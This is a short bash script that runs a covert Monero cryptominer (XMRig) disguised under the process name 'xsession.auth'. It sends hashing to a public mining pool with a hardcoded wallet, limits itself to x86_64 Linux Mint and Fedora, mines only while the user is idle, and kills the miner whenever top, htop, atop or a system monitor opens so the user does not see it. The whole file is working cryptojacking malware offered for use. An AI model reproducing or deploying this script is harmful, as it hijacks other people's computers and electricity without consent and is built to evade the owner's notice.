#!/bin/bash

# Settings
XMRIGNAME=xsession.auth
XPRINTIDLE_NAME=xprintidle
WALLET=41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ
LOCAL_PATH=$HOME/.local/bin
POOL=pool.hashvault.pro:80
INACTIVITY_IN_MINS=1
INACTIVITY_IN_MSEC=$(($INACTIVITY_IN_MINS * 60 * 1000))
LOG_FILE="/tmp/me.log"
DEBUG=0

toggle_debug() {
  if [[ $DEBUG -eq 0 ]]; then
  	DEBUG=1
  	echo "Debugging ON" >> "$LOG_FILE"
  else
    DEBUG=0
    echo "Debugging OFF" >> "$LOG_FILE"
  fi
}

trap 'toggle_debug' SIGUSR1

# Function to log messages if DEBUG is on
log_message() {
  if [[ $DEBUG -eq 1 ]]; then
    echo "$(date): $1" >> "$LOG_FILE"
  fi
}


ensure_os() {
	machine=$(uname -m)
	if [[ $machine != "x86_64" ]]; then
		exit
	fi

	id=$(awk -F'=' '/^ID=/ {print $2}' /etc/os-release)
	if [[ $id != "linuxmint" && $id != "fedora" ]]; then
		exit
	fi
}

run_xmr() {
	cmd="$LOCAL_PATH/$XMRIGNAME -o $POOL -u $WALLET --coin monero -B"
	if ! pgrep $XMRIGNAME; then
		$cmd
	fi		 
}



main() {
	ensure_os

	isUI=$(who | grep -q "(:[0-9])" && echo 1 || echo 0)

	me=$(whoami)
	myproc=$(ps -a)
	
	while true; do 
		sleep 1

		log_message $me
		log_message "$myproc"

		if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
			pkill $XMRIGNAME
			continue
		fi

		if [[ isUI -eq 1 ]]; then
			idle=$($LOCAL_PATH/$XPRINTIDLE_NAME)
			echo "UI, idle for $idle"
			if [[ idle -gt $INACTIVITY_IN_MSEC ]]; then
				run_xmr
			else 
				pkill $XMRIGNAME 
			fi
		else
			idle=$(who -u | awk '{print $5}')
			echo "Text, idle for $idle"
			if [[ $idle == "old" ]]; then
				run_xmr
			elif [[ $idle != "." ]]; then 
				idleH=$(cut -d':' -f1)
				idleM=$(cut -d':' -f2)
				if [[ $idleH -gt 0 || $idleM -gt $INACTIVITY_IN_MINS ]]; then
					run_xmr
				else
					pkill $XMRIGNAME
				fi
			else 
				pkill $XMRIGNAME
			fi
		fi
	done
}

main